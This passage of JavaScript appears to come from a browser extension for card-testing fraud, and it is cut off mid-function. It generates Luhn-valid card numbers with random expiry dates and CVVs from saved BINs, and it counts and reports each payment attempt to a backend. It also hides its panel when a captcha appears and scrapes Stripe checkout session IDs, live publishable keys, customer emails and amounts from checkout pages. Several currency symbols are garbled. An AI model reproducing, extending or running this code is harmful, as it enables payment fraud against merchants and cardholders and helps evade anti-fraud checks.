
  let isMusicPlaying = false
  const autoSSEnabled = true
  const autoSubmitInterval = null
  let savedBINs = []
  let currentBinIndex = 0
  let savedId = ""
  let binBlurTimeout, idBlurTimeout
  let successStartTime = null
  let cardAttemptStartTime = null
  const extractedPaymentData = {
    cardNumber: "",
    bin: "",
    amount: "0",
    currency: "",
    email: "",
    businessUrl: "",
    successUrl: "",
  }
  let paymentDataFound = false
  window.addEventListener('storage', function (e) {
    if (e.key === K.LOGS) {
      const logs = JSON.parse(e.newValue || '[]')
      const logsClearedAt = localStorage.getItem(K.LOGS_CLEARED_AT)
      cardHistory = logsClearedAt ? logs.filter(log => log.time && log.time > logsClearedAt) : logs
      if (typeof updateHistoryDisplay === 'function') {
        updateHistoryDisplay()
      }
    }
    if (e.key === K.LOGS_CLEARED_AT && e.newValue) {
      cardHistory = []
      if (typeof updateHistoryDisplay === 'function') {
        updateHistoryDisplay()
      }
    }
    if (e.key === K.PAGE_BG_COLOR) {
      pageBackgroundColor = e.newValue || DEFAULT_BG_COLOR
      applyCustomStyles()
      const input = document.getElementById('pageBgColorInput')
      if (input) input.value = pageBackgroundColor
    }
  })

  function getSavedBIN() {
    if (savedBINs.length === 0) {
      const stored = localStorage.getItem(K.SAVED_BINS)
      if (stored) {
        try {
          savedBINs = JSON.parse(stored)
        } catch (e) {
          const oldBin = localStorage.getItem(K.SAVED_BINS)
          if (oldBin) savedBINs = [oldBin]
        }
      }
    }
    return savedBINs[currentBinIndex] || savedBINs[0] || ""
  }
  function saveBINs(bins) {
    savedBINs = [...new Set(bins.filter((b) => b && b.length >= 6))]
    localStorage.setItem(K.SAVED_BINS, JSON.stringify(savedBINs))
    // Sync full array to chrome.storage via storage module
    if (window.kimtimStorage && window.kimtimStorage.saveBINs) {
      window.kimtimStorage.saveBINs(savedBINs);
    }
  }
  function switchBin() {
    if (savedBINs.length <= 1) return
    currentBinIndex = (currentBinIndex + 1) % savedBINs.length
    const newBin = savedBINs[currentBinIndex]
    showWarning(`Bin Switch To: ${newBin}`, "info")
    updateBinStatus()

    updateSelectedBinHighlight(true)
  }
  function getSavedId() {
    return savedId || localStorage.getItem(K.USER_ID) || ""
  }
  function saveID(id) {
    savedId = id
    localStorage.setItem(K.USER_ID, id)
    if (window.kimtimStorage && window.kimtimStorage.saveId) {
      window.kimtimStorage.saveId(id);
    }
    window.postMessage({ type: "SAVE_ID", id: id }, "*")
  }
  function saveToggleState(toggleType, value) {
    localStorage.setItem("kimtim_toggle_" + toggleType, value)
    if (window.kimtimStorage && window.kimtimStorage.saveToggleState) {
      window.kimtimStorage.saveToggleState(toggleType, value);
    }
    window.postMessage(
      {
        type: "SAVE_TOGGLE_STATE",
        toggleType: toggleType,
        value: value,
      },
      "*",
    )
  }
  function generateLuhn(number) {
    function calculateSum(num) {
      let sum = 0
      let isEven = false
      for (let i = num.length - 1; i >= 0; i--) {
        let digit = Number.parseInt(num[i])
        if (isEven) {
          digit *= 2
          if (digit > 9) digit -= 9
        }
        sum += digit
        isEven = !isEven
      }
      return sum
    }
    for (let i = 0; i < 10; i++) {
      const testNumber = number + i
      if (calculateSum(testNumber) % 10 === 0) {
        return i
      }
    }
    return 0
  }
  function isAmex(bin) {
    const prefix = bin.replace(/[^0-9]/g, "").substring(0, 2)
    return prefix === "34" || prefix === "37"
  }
  function generateCard(bin) {
    if (!bin) return null
    let binPattern = bin
    let monthPattern = null
    let yearPattern = null
    let cvvPattern = null
    if (bin.includes("|")) {
      const parts = bin.split("|")
      binPattern = parts[0]
      monthPattern = parts[1] || null
      yearPattern = parts[2] || null
      cvvPattern = parts[3] || null
    }
    binPattern = binPattern.replace(/[^0-9xX]/g, "")
    let cardNumber = ""
    for (const c of binPattern) {
      cardNumber += c === "x" || c === "X" ? Math.floor(Math.random() * 10) : c
    }
    const targetLength = isAmex(binPattern) ? 15 : 16
    const remainingLength = targetLength - cardNumber.length - 1
    for (let i = 0; i < remainingLength; i++) {
      cardNumber += Math.floor(Math.random() * 10)
    }
    const checkDigit = generateLuhn(cardNumber)
    const fullCard = cardNumber + checkDigit
    const month = generateMonth(monthPattern)
    const year = generateYear(yearPattern)
    const cvv = generateCvv(cvvPattern, fullCard)
    return { card: fullCard, month, year, cvv }
  }
  function generateMonth(pattern) {
    if (!pattern) return randomMonth()
    pattern = pattern.trim()
    if (pattern === "xx" || pattern === "XX") return randomMonth()
    const monthNum = parseInt(pattern)
    if (monthNum >= 1 && monthNum <= 12) {
      return String(monthNum).padStart(2, "0")
    }
    return randomMonth()
  }
  function generateYear(pattern) {
    if (!pattern) return randomYear()
    pattern = pattern.trim()
    if (pattern === "xx" || pattern === "XX") return randomYear()
    const yearNum = parseInt(pattern)
    if (yearNum >= 0 && yearNum <= 99) {
      return String(yearNum).padStart(2, "0")
    }
    if (yearNum >= 2000 && yearNum <= 2099) {
      return String(yearNum).slice(-2)
    }
    return randomYear()
  }
  function generateCvv(pattern, card) {
    if (!pattern) return randomCvv(card)
    pattern = pattern.trim().toUpperCase()
    const isAmexCard = isAmex(card || "")
    const cvvLength = isAmexCard ? 4 : 3

    if (pattern === "RND" || pattern === "RANDOM" || pattern === "XXXX" || pattern === "XXX" || pattern === "XX") {
      return randomCvv(card)
    }
    let cvv = ""
    for (const c of pattern) {
      cvv += c === "X" ? Math.floor(Math.random() * 10) : c
    }
    if (cvv.length < cvvLength) {
      cvv = cvv.padStart(cvvLength, "0")
    }
    return cvv.substring(0, cvvLength)
  }
  function randomMonth() {
    const now = new Date()
    const currentMonth = now.getMonth() + 1
    const currentYear = now.getFullYear()
    const futureYear = currentYear + Math.floor(Math.random() * 6) + 1
    const m =
      futureYear === currentYear
        ? Math.floor(Math.random() * (12 - currentMonth + 1)) + currentMonth
        : Math.floor(Math.random() * 12) + 1
    return String(m).padStart(2, "0")
  }
  function randomYear() {
    const currentYear = new Date().getFullYear()
    return String(currentYear + Math.floor(Math.random() * 6) + 1).slice(-2)
  }
  function randomCvv(card) {
    return isAmex(card || "")
      ? String(Math.floor(Math.random() * 10000)).padStart(4, "0")
      : String(Math.floor(Math.random() * 1000)).padStart(3, "0")
  }
  function updateBinStatus() {
    const binStatus = document.getElementById("binStatus")
    const bin = getSavedBIN()
    if (binStatus) {
      if (bin) {
        const binInfo =
          savedBINs.length > 1
            ? `BIN ${currentBinIndex + 1}/${savedBINs.length}: ${bin.substring(0, 6)}...`
            : `BIN: ${bin.substring(0, 6)}...`
        binStatus.textContent = binInfo
        binStatus.classList.remove("hidden")
        binStatus.classList.add("success")
      } else {
        binStatus.textContent = ""
        binStatus.classList.add("hidden")
        binStatus.classList.remove("success")
      }
    }
  }
  function loadSavedBins() {
    const stored = localStorage.getItem(K.SAVED_BINS);
    if (stored) {
      try {
        const parsed = JSON.parse(stored);
        if (Array.isArray(parsed) && parsed.length > 0) {
          savedBINs = [...new Set(parsed)];
        }
      } catch (e) {
        const oldBin = localStorage.getItem(K.SAVED_BINS);
        if (oldBin) savedBINs = [oldBin];
      }
    }
    populateBinInputs();

    // Load BINs from chrome.storage (via storage module) and merge
    if (window.kimtimStorage && window.kimtimStorage.loadSavedBINs) {
      window.kimtimStorage.loadSavedBINs(function (chromeBins) {
        if (Array.isArray(chromeBins) && chromeBins.length > 0) {
          // Merge: chrome.storage wins if it has more data
          if (chromeBins.length >= savedBINs.length) {
            savedBINs = [...new Set(chromeBins)];
          }
          localStorage.setItem(K.SAVED_BINS, JSON.stringify(savedBINs));
          populateBinInputs();
          updateSwitchBtnVisibility();
        }
      });
    }
  }

  function populateBinInputs() {
    const container = document.getElementById("binInputsContainer");
    if (container && savedBINs.length > 0) {
      const existingExtraRows = container.querySelectorAll(".bin-input-row:not(:first-child)");
      existingExtraRows.forEach((row) => row.remove());
      const firstInput = document.getElementById("binInput1");
      if (firstInput) firstInput.value = savedBINs[0] || "";
      for (let i = 1; i < savedBINs.length; i++) {
        const newRow = document.createElement("div");
        newRow.className = "bin-input-row";
        newRow.innerHTML = `
        <input type="text" class="input-field bin-input" placeholder="input bin" maxlength="30" value="${savedBINs[i]}">
        <button class="remove-bin-btn" title="Remove">−</button>
      `;
        container.appendChild(newRow);
        newRow.querySelector(".remove-bin-btn").addEventListener("click", () => {
          newRow.remove();
          // Persist remaining BINs
          const inputs = document.querySelectorAll(".bin-input");
          const remaining = Array.from(inputs).map(i => i.value.trim()).filter(b => b && b.length >= 6);
          if (remaining.length > 0) {
            saveBINs(remaining);
            currentBinIndex = Math.min(currentBinIndex, savedBINs.length - 1);
            updateBinStatus();
          }
          updateSwitchBtnVisibility();
        });
      }

      updateSelectedBinHighlight(false);
    }
    updateSwitchBtnVisibility();
  }

  function updateSelectedBinHighlight(animate = false) {
    const allRows = document.querySelectorAll(".bin-input-row");
    allRows.forEach((row, index) => {
      row.classList.remove("bin-selected");
      const input = row.querySelector(".bin-input");
      if (input) {
        input.classList.remove("bin-input-selected");
      }
    });

    if (allRows.length > 0 && currentBinIndex < allRows.length) {
      const selectedRow = allRows[currentBinIndex];
      if (selectedRow) {

        if (animate) {
          selectedRow.style.animation = 'none';
          selectedRow.offsetHeight;
          selectedRow.style.animation = '';
        }
        selectedRow.classList.add("bin-selected");
        const input = selectedRow.querySelector(".bin-input");
        if (input) {
          input.classList.add("bin-input-selected");
        }
      }
    }
  }

  function updateSwitchBtnVisibility() {
    const switchBtn = document.getElementById("switchBinBtn")
    const inputs = document.querySelectorAll(".bin-input")
    const filledInputs = Array.from(inputs).filter((i) => i.value.trim().length >= 6)
    if (switchBtn) {
      if (filledInputs.length > 1 || savedBINs.length > 1) {
        switchBtn.classList.remove("hidden")
      } else {
        switchBtn.classList.add("hidden")
      }
    }
  }
  function updateIdStatus() {
    const idStatus = document.getElementById("idStatus")
    const id = getSavedId()
    if (idStatus) {
      if (id) {
        idStatus.textContent = "ID: " + id.substring(0, 4) + "..."
        idStatus.classList.remove("hidden")
        idStatus.classList.add("success")
      } else {
        idStatus.textContent = ""
        idStatus.classList.add("hidden")
        idStatus.classList.remove("success")
      }
    }
  }
  function toggleMinimize(e) {
    const overlay = document.querySelector(".card-generator-overlay")
    const minimizeBtn = document.getElementById("minimizeBtn")
    if (overlay) {
      isMinimized = !isMinimized
      overlay.classList.toggle("minimized", isMinimized)
      if (minimizeBtn) {
        minimizeBtn.innerHTML = isMinimized ? "✦" : "»"
        minimizeBtn.title = isMinimized ? "Open panel" : "Close panel"
      }

      wasAutoHiddenByCaptcha = false;
      dashboardStateBeforeCaptcha = null;
    }
    if (e) e.stopPropagation()
  }

  function autoHideDashboardForCaptcha() {
    const overlay = document.querySelector(".card-generator-overlay")
    if (!overlay || !isDashboardActive) return;

    if (!isMinimized) {

      dashboardStateBeforeCaptcha = {
        wasMinimized: isMinimized,
        timestamp: Date.now()
      };
      wasAutoHiddenByCaptcha = true;

      isMinimized = true;
      overlay.classList.add("minimized");
      const minimizeBtn = document.getElementById("minimizeBtn");
      if (minimizeBtn) {
        minimizeBtn.innerHTML = "✦";
        minimizeBtn.title = "Open panel (auto-hidden for captcha)";
      }

    }
  }

  function restoreDashboardAfterCaptcha() {
    const overlay = document.querySelector(".card-generator-overlay")
    if (!overlay || !isDashboardActive) return;

    if (wasAutoHiddenByCaptcha && dashboardStateBeforeCaptcha) {

      const timePassed = Date.now() - dashboardStateBeforeCaptcha.timestamp;
      if (timePassed < 5 * 60 * 1000) {

        if (!dashboardStateBeforeCaptcha.wasMinimized) {
          isMinimized = false;
          overlay.classList.remove("minimized");
          const minimizeBtn = document.getElementById("minimizeBtn");
          if (minimizeBtn) {
            minimizeBtn.innerHTML = "»";
            minimizeBtn.title = "Close panel";
          }

        }
      }

      wasAutoHiddenByCaptcha = false;
      dashboardStateBeforeCaptcha = null;
    }
  }

  let wasAutoMinimizedForModal = false;

  function autoMinimizeForModal() {
    const overlay = document.querySelector(".card-generator-overlay");
    if (!overlay || !isDashboardActive) return;

    if (!isMinimized) {
      wasAutoMinimizedForModal = true;
      isMinimized = true;
      overlay.classList.add("minimized");
      const minimizeBtn = document.getElementById("minimizeBtn");
      if (minimizeBtn) {
        minimizeBtn.innerHTML = "✦";
        minimizeBtn.title = "Open panel";
      }
    }
  }

  function autoRestoreAfterModal() {
    const overlay = document.querySelector(".card-generator-overlay");
    if (!overlay || !isDashboardActive) return;

    if (wasAutoMinimizedForModal && isMinimized) {
      isMinimized = false;
      overlay.classList.remove("minimized");
      const minimizeBtn = document.getElementById("minimizeBtn");
      if (minimizeBtn) {
        minimizeBtn.innerHTML = "»";
        minimizeBtn.title = "Close panel";
      }
    }
    wasAutoMinimizedForModal = false;
  }

  let lastToastMessage = ""
  let lastToastTime = 0
  const TOAST_DEBOUNCE_MS = 1500
  function showWarning(message, type = "info") {
    const now = Date.now()
    if (message === lastToastMessage && now - lastToastTime < TOAST_DEBOUNCE_MS) {
      return
    }
    lastToastMessage = message
    lastToastTime = now
    if (type === "info") {
      if (
        message.includes("✅") ||
        message.includes("success") ||
        message.includes("Success") ||
        message.includes("saved") ||
        message.includes("Saved")
      ) {
        type = "success"
      } else if (
        message.includes("❌") ||
        message.includes("error") ||
        message.includes("Error") ||
        message.includes("Decline") ||
        message.includes("decline") ||
        message.includes("failed")
      ) {
        type = "error"
      }
    }
    const cleanMessage = message.replace(/^[✅❌⚠️ℹ️🎉]\s*/, "").trim()
    const icons = {
      success: "✓",
      error: "!",
      info: "i",
    }
    const existing = document.querySelector(".warning-toast")
    if (existing) {
      existing.classList.remove("show")
      existing.classList.add("hide")
      setTimeout(() => existing.remove(), 400)
    }
    const warning = document.createElement("div")
    warning.className = "warning-toast " + type
    warning.style.willChange = 'transform, opacity'
    warning.innerHTML =
      '<div class="toast-icon-wrapper">' +
      '<span class="toast-icon">' +
      icons[type] +
      "</span>" +
      "</div>" +
      '<div class="warning-content">' +
      cleanMessage +
      "</div>"
    document.body.appendChild(warning)
    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        warning.classList.add("show")
      })
    })
    setTimeout(() => {
      if (warning.parentNode) {
        warning.classList.remove("show")
        warning.classList.add("hide")
        setTimeout(() => warning.remove(), 400)
      }
    }, 3000)
  }
  function showCardToast(card, mm, yy, cvv) {
    const fullCard = `${card}|${mm}|${yy}|${cvv}`
    attemptCount++
    if (typeof sendToBackground === 'function') {
      sendToBackground({ type: "UPDATE_LOCAL_STATS", payload: { attempt: true } });
    }

    const savedToken = localStorage.getItem(K.TOKEN)
    if (savedToken) {
      // Route through background script to avoid CSP violation
      sendToBackground({
        type: "API_REQUEST",
        endpoint: "attempt",
        payload: { token: savedToken }
      }).then(response => {
        if (response && response.attempts) {
          userAttemptsCount = response.attempts;
          updateIpBarUserInfo();
        }
      }).catch(err => {
      })
    } else {
    }

    const existing = document.querySelector(".card-toast")
    if (existing) {
      existing.classList.add("hide")
      setTimeout(() => existing.remove(), 300)
    }
    const toast = document.createElement("div")
    toast.className = "card-toast"
    toast.style.willChange = 'transform, opacity'
    toast.innerHTML = `
    <div class="card-toast-icon">💳</div>
    <div class="card-toast-content">
      <div class="card-toast-label">Attempt: ${attemptCount}</div>
      <div class="card-toast-value">${fullCard}</div>
    </div>
    <button class="card-toast-copy" title="Copy">📋</button>
  `
    document.body.appendChild(toast)
    const copyBtn = toast.querySelector(".card-toast-copy")
    copyBtn.addEventListener("click", () => {
      navigator.clipboard.writeText(fullCard).then(() => {
        copyBtn.textContent = "✓"
        setTimeout(() => (copyBtn.textContent = "📋"), 1500)
      })
    })
    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        toast.classList.add("show")
      })
    })
    setTimeout(() => {
      if (toast.parentNode) {
        toast.classList.remove("show")
        toast.classList.add("hide")
        setTimeout(() => toast.remove(), 300)
      }
    }, 3000)
  }
  function createCelebration() {
    createSnowfall()
    createSparkles()
  }
  function createSnowfall() {
    const container = document.createElement("div")
    container.className = "snowfall-container"
    document.body.appendChild(container)
    for (let i = 0; i < 60; i++) {
      const snowflake = document.createElement("div")
      const posClass = "pos-" + Math.floor(Math.random() * 20) * 5
      const sizeClass = "size-" + ["sm", "md", "lg"][Math.floor(Math.random() * 3)]
      const delayClass = "delay-" + Math.floor(Math.random() * 5)
      const durationClass = "dur-" + Math.floor(Math.random() * 3)
      const colorClass = ["white", "gold", "green"][Math.floor(Math.random() * 3)]
      snowflake.className = `snowflake ${posClass} ${sizeClass} ${delayClass} ${durationClass} ${colorClass}`
      container.appendChild(snowflake)
    }
    setTimeout(() => container.remove(), 12000)
  }
  function createSparkles() {
    const container = document.createElement("div")
    container.className = "celebration-container"
    document.body.appendChild(container)
    for (let i = 0; i < 30; i++) {
      const sparkle = document.createElement("div")
      const posXClass = "sparkle-x-" + Math.floor(Math.random() * 10) * 10
      const posYClass = "sparkle-y-" + Math.floor(Math.random() * 10) * 10
      const delayClass = "sparkle-delay-" + Math.floor(Math.random() * 10)
      sparkle.className = `sparkle-star ${posXClass} ${posYClass} ${delayClass}`
      container.appendChild(sparkle)
    }
    setTimeout(() => container.remove(), 8000)
  }
  const currencySymbols = {

    usd: "$",
    eur: "€",
    gbp: "£",
    jpy: "¥",
    cny: "¥",
    cnh: "¥",

    inr: "₹",
    krw: "₩",
    thb: "à¸¿",
    php: "₱",
    myr: "RM",
    sgd: "S$",
    hkd: "HK$",
    twd: "NT$",
    idr: "Rp",
    vnd: "₫",
    pkr: "₨",
    bdt: "à§³",
    lkr: "Rs",
    npr: "Rs",
    mmk: "K",
    khr: "áŸ›",
    lak: "₭",

    chf: "CHF",
    sek: "kr",
    nok: "kr",
    dkk: "kr",
    pln: "zÅ‚",
    czk: "KÄ",
    huf: "Ft",
    ron: "lei",
    bgn: "лв",
    hrk: "kn",
    rsd: "дин",
    uah: "₴",
    rub: "₽",
    byn: "Br",
    mdl: "L",
    all: "L",
    mkd: "ден",
    bam: "KM",
    isk: "kr",

    cad: "C$",
    mxn: "MX$",
    brl: "R$",
    ars: "AR$",
    clp: "CL$",
    cop: "CO$",
    pen: "S/",
    uyu: "$U",
    pyg: "₲",
    bob: "Bs",
    crc: "₡",
    gtq: "Q",
    hnl: "L",
    nio: "C$",
    pab: "B/.",
    dop: "RD$",
    jmd: "J$",
    ttd: "TT$",
    bbd: "Bds$",
    bsd: "B$",
    kyd: "CI$",
    xcd: "EC$",
    awg: "Æ’",
    ang: "Æ’",
    srd: "Sr$",
    gyd: "G$",
    bzd: "BZ$",
    htg: "G",

    aed: "Ø¯.Ø¥",
    sar: "﷼",
    qar: "﷼",
    omr: "﷼",
    bhd: "BD",
    kwd: "KD",
    jod: "JD",
    lbp: "L£",
    egp: "E£",
    ils: "₪",
    try: "₺",
    irr: "﷼",
    iqd: "Ø¹.Ø¯",
    syp: "£S",
    yer: "﷼",
    zar: "R",
    ngn: "₦",
    kes: "KSh",
    ugx: "USh",
    tzs: "TSh",
    ghs: "GH₵",
    xof: "CFA",
    xaf: "FCFA",
    mad: "DH",
    dzd: "DA",
    tnd: "DT",
    lyd: "LD",
    etb: "Br",
    rwf: "FRw",
    mur: "Rs",
    scr: "Rs",

    aud: "A$",
    nzd: "NZ$",
    fjd: "FJ$",
    pgk: "K",
    wst: "WS$",
    top: "T$",
    vuv: "VT",
    sbd: "SI$",

    btc: "₿",
    eth: "Îž",
    xrp: "XRP",
    ltc: "Å",
  }
  function getCurrencySymbol(code) {
    if (!code) return "$"
    return currencySymbols[code.toLowerCase()] || code.toUpperCase() + " "
  }
  function extractPaymentData(data) {
    if (paymentDataFound || !data || typeof data !== "object") return
    function findValue(obj, key) {
      if (!obj || typeof obj !== "object") return null
      if (key in obj) return obj[key]
      for (const prop in obj) {
        if (obj[prop] && typeof obj[prop] === "object") {
          const found = findValue(obj[prop], key)
          if (found !== null) return found
        }
      }
      return null
    }

    function cleanBusinessUrl(url) {
      if (!url) return null;
      try {
        let clean = url.toString().trim();

        clean = clean.replace(/^https?:\/\//, '');

        clean = clean.replace(/^www\./, '');

        clean = clean.split('/')[0];
        clean = clean.split('?')[0];
        clean = clean.split('#')[0];

        clean = clean.split(':')[0];

        return clean || null;
      } catch (e) {
        return url;
      }
    }

    let updated = false

    if (!extractedPaymentData.businessUrl) {
      try {
        let rawBusinessUrl = null;

        if (data.account_settings?.business_url) {
          rawBusinessUrl = data.account_settings.business_url;
        }

        else if (data.account_settings?.display_name) {
          rawBusinessUrl = data.account_settings.display_name;
        }

        else if (data.statement_descriptor) {
          rawBusinessUrl = data.statement_descriptor;
        }

        else {
          rawBusinessUrl = findValue(data, "business_url") || findValue(data, "display_name");
        }

        if (rawBusinessUrl) {
          extractedPaymentData.businessUrl = cleanBusinessUrl(rawBusinessUrl);
          updated = true;
        }
      } catch (e) { }
    }

    if (!extractedPaymentData.email) {
      const email = data.customer_email || findValue(data, "customer_email")
      if (email) {
        extractedPaymentData.email = email
        updated = true
      }
    }

    if (!extractedPaymentData.successUrl) {
      try {
        let successUrl = null;
        if (data.success_url) {
          successUrl = data.success_url;
        }
        else if (data.return_url) {
          successUrl = data.return_url;
        }
        else if (data.redirect_url) {
          successUrl = data.redirect_url;
        }
        else if (data.payment_intent?.return_url) {
          successUrl = data.payment_intent.return_url;
        }
        else if (data.confirmation_url) {
          successUrl = data.confirmation_url;
        }
        else if (data.next_action?.redirect_to_url?.url) {
          successUrl = data.next_action.redirect_to_url.url;
        }
        else {
          successUrl = findValue(data, "success_url");
        }
        if (successUrl) {
          extractedPaymentData.successUrl = successUrl;
          updated = true;
        }
      } catch (e) { }
    }

    if (!extractedPaymentData.amount || extractedPaymentData.amount === "0.00" || extractedPaymentData.amount === "0") {
      try {
        let amount = null;
        let originalCurrency = null;

        if (data.line_item_group?.localized_prices_metas && Array.isArray(data.line_item_group.localized_prices_metas)) {
          const usdMeta = data.line_item_group.localized_prices_metas.find(m => m.currency === 'usd');
          if (usdMeta && usdMeta.total && usdMeta.total > 0) {
            amount = usdMeta.total;
            originalCurrency = 'usd';
          }
        }

        if (!amount && data.line_item_group?.presentment_exchange_rate_meta?.integration_currency) {
          const integrationCurrency = data.line_item_group.presentment_exchange_rate_meta.integration_currency;
          const exchangeRate = parseFloat(data.line_item_group.presentment_exchange_rate_meta.exchange_rate);
          if (data.line_item_group.total && exchangeRate > 0) {
            amount = Math.round(data.line_item_group.total / exchangeRate);
            originalCurrency = integrationCurrency;
          }
        }

        if (!amount && data.line_item_group?.total && data.line_item_group.total > 0) {
          amount = data.line_item_group.total;
          originalCurrency = data.line_item_group.currency || data.currency;
        }

        if (!amount && data.line_item_group?.due && data.line_item_group.due > 0) {
          amount = data.line_item_group.due;
          originalCurrency = data.line_item_group.currency || data.currency;
        }

        if (!amount && data.line_item_group?.line_items?.[0]) {
          const lineItem = data.line_item_group.line_items[0];
          if (lineItem.total && lineItem.total > 0) {
            amount = lineItem.total;
            originalCurrency = data.line_item_group.currency || data.currency;
          } else if (lineItem.price?.unit_amount && lineItem.price.unit_amount > 0) {
            amount = lineItem.price.unit_amount * (lineItem.quantity || 1);
            originalCurrency = lineItem.price.currency || data.currency;
          }
        }

        if (!amount && data.amount && typeof data.amount === "number" && data.amount > 0) {
          amount = data.amount;
        }
        if (!amount && data.payment_intent?.amount && data.payment_intent.amount > 0) {
          amount = data.payment_intent.amount;
        }
        if (!amount && data.invoice?.amount_due && data.invoice.amount_due > 0) {
          amount = data.invoice.amount_due;
        }
        if (!amount && data.invoice?.lines?.data?.[0]?.amount && data.invoice.lines.data[0].amount > 0) {
          amount = data.invoice.lines.data[0].amount;
        }
        if (!amount && data.amount_received && data.amount_received > 0) {
          amount = data.amount_received;
        }
        if (!amount && data.amount_capturable && data.amount_capturable > 0) {
          amount = data.amount_capturable;
        }
        if (!amount && data.lines?.data?.[0]?.amount && data.lines.data[0].amount > 0) {
          amount = data.lines.data[0].amount;
        }
        if (!amount && data.line_items?.data?.[0]?.amount_total && data.line_items.data[0].amount_total > 0) {
          amount = data.line_items.data[0].amount_total;
        }
        if (!amount && data.amount_total && data.amount_total > 0) {
          amount = data.amount_total;
        }
        if (!amount && data.amount_due && data.amount_due > 0) {
          amount = data.amount_due;
        }
        if (!amount && data.amount_paid && data.amount_paid > 0) {
          amount = data.amount_paid;
        }
        if (!amount && data.total && data.total > 0) {
          amount = data.total;
        }

        if (!amount) {
          const unitAmount = findValue(data, "unit_amount_decimal");
          if (unitAmount && parseInt(unitAmount) > 0) {
            amount = parseInt(unitAmount);
          }
        }
        if (!amount) {
          const unitAmount = findValue(data, "unit_amount");
          if (unitAmount && parseInt(unitAmount) > 0) {
            amount = parseInt(unitAmount);
          }
        }

        if (!amount) {
          const piAmount = findValue(data, "payment_intent");
          if (piAmount && typeof piAmount === "object" && piAmount.amount && piAmount.amount > 0) {
            amount = piAmount.amount;
          }
        }

        if (amount !== null && amount > 0) {
          extractedPaymentData.amount = (Number.parseInt(amount) / 100).toFixed(2);
          if (originalCurrency) {
            extractedPaymentData.currency = originalCurrency.toLowerCase();
          }
          updated = true;
        }
      } catch (e) {
      }
    }

    if (!extractedPaymentData.currency) {
      try {
        let currency = null;

        if (data.line_item_group?.localized_prices_metas && Array.isArray(data.line_item_group.localized_prices_metas)) {
          const usdMeta = data.line_item_group.localized_prices_metas.find(m => m.currency === 'usd');
          if (usdMeta) {
            currency = 'usd';
          }
        }

        if (!currency && data.line_item_group?.presentment_exchange_rate_meta?.integration_currency) {
          currency = data.line_item_group.presentment_exchange_rate_meta.integration_currency;
        }

        if (!currency) {
          currency =
            data.line_item_group?.currency ||
            data.currency ||
            data.line_items?.data?.[0]?.currency ||
            findValue(data, "currency");
        }

        if (currency) {
          extractedPaymentData.currency = currency.toLowerCase()
          updated = true
        }
      } catch (e) { }
    }

    if (!extractedPaymentData.businessUrl) {
      try {
        let businessUrl = null;
        if (data.business_url) {
          businessUrl = data.business_url;
        }
        else if (data.account_settings?.business_url) {
          businessUrl = data.account_settings.business_url;
        }
        else if (data.merchant_business_url) {
          businessUrl = data.merchant_business_url;
        }
        else if (data.account_settings?.display_name) {
          businessUrl = data.account_settings.display_name;
        }
        else if (data.account_settings?.order_summary_display_name) {
          businessUrl = data.account_settings.order_summary_display_name;
        }
        else if (data.statement_descriptor) {
          businessUrl = data.statement_descriptor;
        }
        else {
          const displayName = findValue(data, "display_name");
          if (displayName) {
            businessUrl = displayName;
          }
        }
        if (!businessUrl) {
          businessUrl = findValue(data, "business_url");
        }
        if (businessUrl) {
          extractedPaymentData.businessUrl = cleanBusinessUrl(businessUrl);
          updated = true;
        }
      } catch (e) { }
    }
    const hasAllValues = Object.values(extractedPaymentData).every((x) => x !== "")
    if (hasAllValues) {
      paymentDataFound = true

      if (extractedPaymentData.businessUrl) {
        checkBinRecommendation(extractedPaymentData.businessUrl);
      }
    } else if (updated) {
      if (!extractedPaymentData.businessUrl) {
        try {

          let hostname = window.location.hostname;
          hostname = hostname.replace(/^(checkout|pay|billing|buy)\./, '');
          hostname = hostname.replace(/^www\./, '');
          extractedPaymentData.businessUrl = hostname;
        } catch (e) { }
      }
      if (!extractedPaymentData.successUrl) {
        try {
          extractedPaymentData.successUrl = window.location.href
        } catch (e) { }
      }

      if (extractedPaymentData.businessUrl && !binRecommendationShown) {
        checkBinRecommendation(extractedPaymentData.businessUrl);
      }
    }
  }
  function extractCsLive(urlOrString) {
    if (!urlOrString || typeof urlOrString !== "string") return null
    const liveUrlPathMatch = urlOrString.match(/\/c\/pay\/(cs_live_[a-zA-Z0-9]+)(?:[#\/]|$)/)
    if (liveUrlPathMatch) return liveUrlPathMatch[1]
    const livePaymentPagesMatch = urlOrString.match(/\/payment_pages\/(cs_live_[a-zA-Z0-9]+)/)
    if (livePaymentPagesMatch) return livePaymentPagesMatch[1]
    const liveCheckoutMatch = urlOrString.match(/checkout\.stripe\.com\/(?:c\/)?pay\/(cs_live_[a-zA-Z0-9]+)/)
    if (liveCheckoutMatch) return liveCheckoutMatch[1]
    const liveBoundaryMatch = urlOrString.match(/cs_live_[a-zA-Z0-9]+(?=[#\/\?&\s]|$)/)
    if (liveBoundaryMatch) return liveBoundaryMatch[0]
    const testUrlPathMatch = urlOrString.match(/\/c\/pay\/(cs_test_[a-zA-Z0-9]+)(?:[#\/]|$)/)
    if (testUrlPathMatch) return testUrlPathMatch[1]
    const testPaymentPagesMatch = urlOrString.match(/\/payment_pages\/(cs_test_[a-zA-Z0-9]+)/)
    if (testPaymentPagesMatch) return testPaymentPagesMatch[1]
    const testCheckoutMatch = urlOrString.match(/checkout\.stripe\.com\/(?:c\/)?pay\/(cs_test_[a-zA-Z0-9]+)/)
    if (testCheckoutMatch) return testCheckoutMatch[1]
    const testBoundaryMatch = urlOrString.match(/cs_test_[a-zA-Z0-9]+(?=[#\/\?&\s]|$)/)
    if (testBoundaryMatch) return testBoundaryMatch[0]
    return null
  }
  function extractPkLive() {
    const pageContent = document.documentElement.innerHTML
    const pkLiveMatch = pageContent.match(/pk_live_[a-zA-Z0-9]+/)
    if (pkLiveMatch) return pkLiveMatch[0]
    const scripts = document.querySelectorAll("script")
    for (const script of scripts) {
      const content = script.textContent || script.innerText || ""
      const liveMatch = content.match(/pk_live_[a-zA-Z0-9]+/)
      if (liveMatch) return liveMatch[0]
    }
    try {
      const stripeElements = document.querySelectorAll("[data-stripe-publishable-key]")
      for (const el of stripeElements) {
        const key = el.getAttribute("data-stripe-publishable-key")
        if (key && key.startsWith("pk_live_")) return key
      }
    } catch (e) { }
    const pkTestMatch = pageContent.match(/pk_test_[a-zA-Z0-9]+/)
    if (pkTestMatch) return pkTestMatch[0]
    for (const script of scripts) {
      const content = script.textContent || script.innerText || ""
      const testMatch = content.match(/pk_test_[a-zA-Z0-9]+/)
      if (testMatch) return testMatch[0]
    }
    try {
      const stripeElements = document.querySelectorAll("[data-stripe-publishable-key]")
      for (const el of stripeElements) {
